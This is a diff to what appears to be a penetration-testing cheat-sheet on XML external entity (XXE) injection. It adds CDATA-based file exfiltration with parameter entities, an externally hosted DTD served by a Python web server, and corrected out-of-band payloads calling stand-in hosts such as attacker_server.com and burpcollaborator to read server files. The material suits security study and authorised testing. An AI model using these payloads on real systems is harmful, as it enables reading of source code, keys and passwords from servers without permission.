@@ -48,7 +48,36 @@
 * Enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server.
 * Another benefit of local file disclosure is the ability to obtain the source code of the web application.
 * If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.
-* Advanced Exfiltration with CDATA
+* ### Advanced Exfiltration with CDATA
+  * Extract any kind of data (including binary data) for any web application backend.
+  * To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`).
+  * This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
+  * Define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element.
+  * <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;!DOCTYPE email [
+      &#x3C;!ENTITY begin "&#x3C;![CDATA[">
+      &#x3C;!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+      &#x3C;!ENTITY end "]]>">
+      &#x3C;!ENTITY joined "&#x26;begin;&#x26;file;&#x26;end;">
+    ]>
+    </code></pre>
+  * If we reference the \&joined; entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities.
+  * To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD.
+  * What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined.
+  * <pre class="language-xml" data-line-numbers><code class="lang-xml">&#x3C;!-- Create a external DTD File -->
+    echo '&#x3C;!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+    &#x3C;!-- Host a Server -->
+    python3 -m http.server 8000
+    &#x3C;!-- XXE Payload -->
+    &#x3C;!DOCTYPE email [
+      &#x3C;!ENTITY % begin "&#x3C;![CDATA["> &#x3C;!-- prepend the beginning of the CDATA tag -->
+      &#x3C;!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> &#x3C;!-- reference external file -->
+      &#x3C;!ENTITY % end "]]>"> &#x3C;!-- append the end of the CDATA tag -->
+      &#x3C;!ENTITY % xxe SYSTEM "http://&#x3C;IP>:8000/xxe.dtd"> &#x3C;!-- reference our external DTD -->
+      %xxe;
+    ]>
+    &#x3C;email>&#x26;joined;&#x3C;/email> &#x3C;!-- reference the &#x26;joined; entity to print the file content -->
+    </code></pre>
+  *
 
 ## Remote Code Execution
 
@@ -99,14 +128,14 @@
 
 ### Out-of-Band Interaction via XML Parameter Entities &#x20;
 
-* `<!DOCTYPE foo [ <!ENTITY % xxe; SYSTEM "http://burpcollaborator" > %xxe; ]>`&#x20;
+* `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burpcollaborator" > %xxe; ]>`&#x20;
 * Invoke `%xxe;` within the existing DTD if the above method does not work
 
 ### Exfiltrate Data Out-of-Band <sub>(only if application allows to fetch contents remotely)</sub>
 
 * Create a `malicious.dtd` external DTD file and host it in attacker controlled server to be fetched by victim server
-* Payload to be provided in victim application
-  * `<!DOCTYPE foo [ % xxe; SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`
+* Payload to be provided in vulnerable application
+  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`
 
 <details>
 
@@ -124,9 +153,10 @@
 ### Retrieve Data via Error Messages <sub>(only if application allows to fetch contents remotely)</sub>
 
 * Effective only if the application returns the resulting error message within its response
+* Try to send malformed XML data, and see if the web application displays any errors. To do so, we delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity.
 * Host external DTD `malicious.dtd`&#x20;
-* Payload to be provided in victim application&#x20;
-  * `<!DOCTYPE foo [ % xxe; SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`
+* Payload to be provided in vulnerable application&#x20;
+  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_IP.com/malicious.dtd"> %xxe; ]>`
 * External DTD is only possible because XML parameter entity can be used within the definition of another parameter entity which is not possible in internal DTD
 
 <details>
